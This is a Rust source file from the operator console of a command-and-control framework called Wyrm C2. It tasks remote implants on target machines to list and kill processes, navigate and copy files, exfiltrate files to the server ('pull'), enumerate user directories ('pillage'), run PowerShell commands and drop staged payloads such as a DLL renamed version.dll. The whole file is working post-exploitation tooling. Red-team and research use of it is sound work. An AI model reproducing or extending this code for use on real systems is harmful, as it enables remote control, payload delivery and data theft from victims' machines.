use std::mem::take;

use chrono::{DateTime, Utc};
use shared::{
    pretty_print::{print_failed, print_success},
    tasks::{AdminCommand, Command, FileDropMetadata},
};
use shared_c2_client::{NotificationsForAgents, command_to_string};

use crate::{
    net::{IsTaskingAgent, api_request},
    state::{Cli, TabConsoleMessages},
};

pub fn list_processes(cli: &Cli) {
    if let Err(e) = api_request(
        AdminCommand::ListProcesses,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task ListProcesses on agent. {e}"));
    }
}

pub fn change_directory(cli: &Cli, new_dir: &[&str]) {
    let new_dir = new_dir.join(" ").trim().to_string();

    if let Err(e) = api_request(
        AdminCommand::Cd(new_dir),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task Cd on agent. {e}"));
    }
}

pub fn kill_agent(cli: &Cli) {
    if let Err(e) = api_request(
        AdminCommand::KillAgent,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task KillAgent. {e}"));
    }
}

pub fn kill_process(cli: &Cli, pid: &&str) {
    // Validate, even through we pass a String - check it client side
    let pid_as_int: i32 = pid.parse().unwrap_or(0);
    if pid.is_empty() || pid_as_int == 0 {
        print_failed(format!("No pid or non-numeric supplied."));
    }

    if let Err(e) = api_request(
        AdminCommand::KillProcessById(pid.to_string()),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task KillAgent. {e}"));
    }
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub fn copy_file(cli: &Cli, raw_input: String) {
    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            cli.write_console_error(&cli.uid, "Could not get data from tokens.");
            return;
        }
    };

    if let Err(e) = api_request(
        AdminCommand::Copy((from, to)),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        cli.write_console_error(&cli.uid, format!("Failed to task Copy. {e}"));
        return;
    }
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub fn move_file(cli: &Cli, raw_input: String) {
    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            cli.write_console_error(&cli.uid, "Could not get data from tokens.");
            return;
        }
    };

    if let Err(e) = api_request(
        AdminCommand::Move((from.to_string(), to.to_string())),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        cli.write_console_error(&cli.uid, "Failed to task Move.");
        return;
    }
}

/// Pull a single file from the target machine
pub fn pull_file(cli: &Cli, target: String) {
    if target.is_empty() {
        print_failed(format!("Please specify a target file."));
    }

    let target = match split_string_slices_to_n(1, &target, DiscardFirst::Chop) {
        Some(mut inner) => take(&mut inner[0]),
        None => {
            cli.write_console_error(&cli.uid, "Could not get data from tokens.");
            return;
        }
    };

    if let Err(e) = api_request(
        AdminCommand::Pull(target.to_string()),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task Move. {e}"));
    }
}

pub fn remove_agent(cli: &Cli) {
    if let Err(e) = api_request(
        AdminCommand::RemoveAgentFromList,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task Cd on agent. {e}"));
    }
}

pub fn exit() {
    print_success("Thank you for using Wyrm C2!");
    std::process::exit(0);
}

pub fn unknown_command(cli: &mut Cli) {
    cli.write_console_error(&cli.uid, "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
            to see the instructions for that command.");

    print_failed(
        "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
        to see the instructions for that command.",
    );
}

pub fn set_sleep(sleep_time: &str, cli: &Cli) {
    let sleep_time: i64 = match sleep_time.parse() {
        Ok(s) => s,
        Err(e) => {
            print_failed(format!("Could not parse new sleep time. {e}"));
            return;
        }
    };

    // As on the C2 we need the sleep time to be an i64, but the implant needs it to be a u64,
    // we want to make sure we aren't going to get any overflow behaviour which could lead to
    // denial of service or other errors. We check the input number is not less than or = to 0.
    // We do not need to check the upper bound because an i64 MAX will fit into a u64.
    if sleep_time <= 0 {
        print_failed("Sleep time must be greater than 1 (second)");
        return;
    }

    if let Err(e) = api_request(
        AdminCommand::Sleep(sleep_time),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to set sleep time on agent. {e}"));
    }
}

pub fn pull_notifications_for_agent(cli: &mut Cli) {
    let result = match api_request(
        AdminCommand::PullNotifications,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        Ok(r) => r,
        Err(e) => {
            print_failed(format!("Failed to task PullNotifications on agent. {e}"));
            return;
        }
    };

    let serialised_response: NotificationsForAgents = match serde_json::from_slice(&result) {
        Ok(ser) => match ser {
            Some(notifs) => notifs,
            None => return,
        },
        Err(e) => {
            print_failed(format!("Could not deserialise notifications on agent. {e}"));
            return;
        }
    };

    let mut write_lock = cli.connected_agents.write().unwrap();
    let agent = match write_lock.as_mut() {
        Some(agent) => agent.get_mut(&cli.uid).unwrap(),
        None => return,
    };

    for item in serialised_response {
        let result = Some(item.format_console_output());
        let cmd = Command::from_u32(item.command_id as _);
        let cmd_string = command_to_string(&cmd);

        agent.output_messages.push(TabConsoleMessages {
            event: cmd_string,
            time: item.time_completed.to_string(),
            messages: result,
        });
    }
}

pub fn clear_terminal(cli: &mut Cli) {
    let mut lock = cli.connected_agents.write().unwrap();
    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();
    agent.output_messages.clear();
}

pub fn pwd(cli: &Cli) {
    let _result = match api_request(
        AdminCommand::Pwd,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        Ok(r) => r,
        Err(e) => {
            print_failed(format!("Failed to task PullNotifications on agent. {e}"));
            return;
        }
    };
}

pub fn dir_listing(cli: &Cli) {
    if let Err(e) = api_request(
        AdminCommand::Ls,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task Ls on agent. {e}"));
    }
}

pub fn show_server_time(cli: &Cli) {
    let result = match api_request(
        AdminCommand::ShowServerTime,
        IsTaskingAgent::No,
        &cli.credentials,
    ) {
        Ok(r) => r,
        Err(e) => {
            print_failed(format!("Failed to task PullNotifications on agent. {e}"));
            return;
        }
    };

    let deserialised_response: DateTime<Utc> = match serde_json::from_slice(&result) {
        Ok(ser) => match ser {
            Some(time) => time,
            None => return,
        },
        Err(e) => {
            print_failed(format!("Could not deserialise server time. {e}"));
            return;
        }
    };

    let mut lock = cli.connected_agents.write().unwrap();
    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();
    agent
        .output_messages
        .push(TabConsoleMessages::non_agent_message(
            "ServerTime".into(),
            deserialised_response.to_string(),
        ));
}

pub fn pillage(cli: &Cli) {
    if let Err(e) = api_request(
        AdminCommand::ListUsersDirs,
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        print_failed(format!("Failed to task ListUsersDirs on agent. {e}"));
    }
}

/// Show the help menu to the user
pub fn show_help(cli: &mut Cli) {
    let messages: Option<Vec<String>> = Some(vec![
        "help [command]".into(),
        "exit (Exit's the client)".into(),
        "servertime (Shows the local time of the server)".into(),
        "n (Gets new notifications for the agent)".into(),
        "kill_agent (terminates the agent on the endpoint)".into(),
        "remove_agent (removes the agent from the interface; until it reconnects)".into(),
        "cls | clear (clears the terminal)".into(),
        "".into(),
        "set sleep [time SECONDS]".into(),
        "ps".into(),
        "cd [relative path | absolute path]".into(),
        "pwd".into(),
        "ls".into(),
        "cp <from> <to> | copy <from> <to> (accepts relative or absolute paths)".into(),
        "mv <from> <to> | move <from> <to> (accepts relative or absolute paths)".into(),
        "pull <path> (Exfiltrates a file to the C2. For more info, type help pull.)".into(),
        "pillage".into(),
        "run".into(),
        "kill <pid>".into(),
        "drop <server recognised name> <filename to drop on disk (including extension)>".into(),
    ]);

    let mut lock = cli.connected_agents.write().unwrap();
    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();

    agent.output_messages.push(TabConsoleMessages {
        event: "HelpMenu".into(),
        time: "-".into(),
        messages,
    });
}

/// Shows help for a specified command where further details are available
pub fn show_help_for_command(cli: &mut Cli, command: &str) {
    let messages: Vec<String> = match command {
        "drop" => vec![
            "Drops a file to disk. The file dropped must be staged on the C2 first, otherwise the process will not complete.".into(),
            "This command will drop the payload into the CURRENT working directory of the agent.".into(),
            "Arg1: The colloquial server name for the file you are dropping (appears in the Staged Resources panel as the 'Name' column)".into(),
            "Arg2: The destination filename of what you want to drop, if you want this file to have an extension, you must included that.".into(),
            "          For example, if dropping a DLL staged as my_dll, you may wish to do: drop my_dll version.dll, which will save the DLL as version.dll on disk.".into(),
        ],
        "pull" => vec![
            "Usage: pull <file path>".into(),
            "Exfiltrates a file to the C2 by its file path, which can be relative or absolute. This will upload the file to the".into(),
            "C2 and save it under: c2/<target hostname>/<file path as per targets full path>.".into(),
            "If a file already exists at that location, it will be overwritten. Note, using `pull` will cause the file to be read into memory".into(),
            "on the target machine in full, thus you should only use this on files which are smaller than the amount of available RAM on the machine.".into(),
            "Streamed `pull` is coming in a future release.".into(),
        ],
        _ => vec!["No help pages available for this command, or it does not exist.".into()],
    };

    let mut lock = cli.connected_agents.write().unwrap();
    let agent = lock.as_mut().unwrap().get_mut(&cli.uid).unwrap();

    agent.output_messages.push(TabConsoleMessages {
        event: "HelpMenu".into(),
        time: "-".into(),
        messages: Some(messages),
    });
}

pub fn run_powershell_command(cli: &Cli, args: &[&str]) {
    let mut args_string: String = String::new();
    for arg in args {
        args_string += arg;
        args_string += " ";
    }

    let args_trimmed = args_string.trim().to_string();

    if let Err(e) = api_request(
        AdminCommand::Run(args_trimmed),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        cli.write_console_error(&cli.uid, &format!("Failed to task Run on agent. {e}"));
        print_failed(format!("Failed to task Run on agent. {e}"));
    }
}

/// Instructs the agent to drop a staged file onto disk on the target endpoint.
pub fn file_dropper(cli: &Cli, args: &[&str]) {
    if args.len() != 2 {
        cli.write_console_error(
            &cli.uid,
            "Invalid number of args passed into the `drop` command.",
        );
        return;
    }

    let file_data = unsafe {
        FileDropMetadata {
            internal_name: args.get_unchecked(0).to_string(),
            download_name: args.get_unchecked(1).to_string(),
            // This is computed on the C2
            download_uri: None,
        }
    };

    if let Err(e) = api_request(
        AdminCommand::Drop(file_data),
        IsTaskingAgent::Yes(&cli.uid),
        &cli.credentials,
    ) {
        cli.write_console_error(&cli.uid, &format!("Failed to task Drop on agent. {e}"));
    }
}

/// Determines whether the [`split_string_slices_to_n`] function should discard the first
/// found substring or not - this would be useful where the command is present in the input
/// string.
#[derive(PartialEq, Eq)]
enum DiscardFirst {
    Chop,
    DontChop,
}

/// Splits a string into exactly `n` chunks, treating quoted substrings as single tokens.
/// Optionally discards the first token, which is useful if the input string begins with a command.
///
/// # Args
/// * `n` - The expected number of resulting tokens.  
/// * `strs` - The input string slice to be tokenised.  
/// * `discard_first` - Whether the first discovered token should be discarded (`Chop`) or kept (`DontChop`).  
///
/// # Returns
/// Returns `Some(Vec<String>)` if exactly `n` tokens are produced after processing,  
/// otherwise returns `None`.
///
/// # Example
/// ```
/// let s = "a b  \"c d\" e".to_string();
/// assert_eq!(
///     split_string_slices_to_n(4, &s, DiscardFirst::DontChop),
///     Some(vec![
///         "a".to_string(),
///         "b".to_string(),
///         "c d".to_string(),
///         "e".to_string(),
///     ])
/// )
/// ```
fn split_string_slices_to_n(
    n: usize,
    strs: &str,
    mut discard_first: DiscardFirst,
) -> Option<Vec<String>> {
    // Flatten the slices
    let mut chunks: Vec<String> = Vec::new();
    let mut s = String::new();
    let mut toggle: bool = false;

    for (_, c) in strs.chars().enumerate() {
        if c == '"' {
            if toggle {
                toggle = false;
                if !s.is_empty() {
                    chunks.push(take(&mut s));
                }
                s.clear();
            } else {
                // Start of a quoted string
                toggle = true;
            }
        } else if c == ' ' && !toggle {
            if discard_first == DiscardFirst::Chop && chunks.is_empty() {
                discard_first = DiscardFirst::DontChop;
                s.clear();
            }

            if !s.is_empty() {
                chunks.push(take(&mut s));
            }
            s.clear();
        } else {
            s.push(c);
        }
    }

    // Handle the very last chunk which didn't get pushed by the loop
    if !s.is_empty() {
        chunks.push(s);
    }

    if chunks.len() != n {
        return None;
    }

    Some(chunks)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tokens_with_no_quotes() {
        let s = "a b  c d e f    g    ".to_string();
        assert_eq!(
            split_string_slices_to_n(7, &s, DiscardFirst::DontChop),
            Some(vec![
                "a".to_string(),
                "b".to_string(),
                "c".to_string(),
                "d".to_string(),
                "e".to_string(),
                "f".to_string(),
                "g".to_string()
            ])
        )
    }

    #[test]
    fn tokens_with_quotes_space() {
        let s = "a b  \"c  d\" e".to_string();
        assert_eq!(
            split_string_slices_to_n(4, &s, DiscardFirst::DontChop),
            Some(vec![
                "a".to_string(),
                "b".to_string(),
                "c  d".to_string(),
                "e".to_string(),
            ])
        )
    }

    #[test]
    fn tokens_with_quotes() {
        let s = "a b  \"c d\" e".to_string();
        assert_eq!(
            split_string_slices_to_n(4, &s, DiscardFirst::DontChop),
            Some(vec![
                "a".to_string(),
                "b".to_string(),
                "c d".to_string(),
                "e".to_string(),
            ])
        )
    }

    #[test]
    fn tokens_bad_count() {
        let s = "a b  \"c d\" e".to_string();
        assert_eq!(
            split_string_slices_to_n(5, &s, DiscardFirst::DontChop),
            None
        )
    }
}
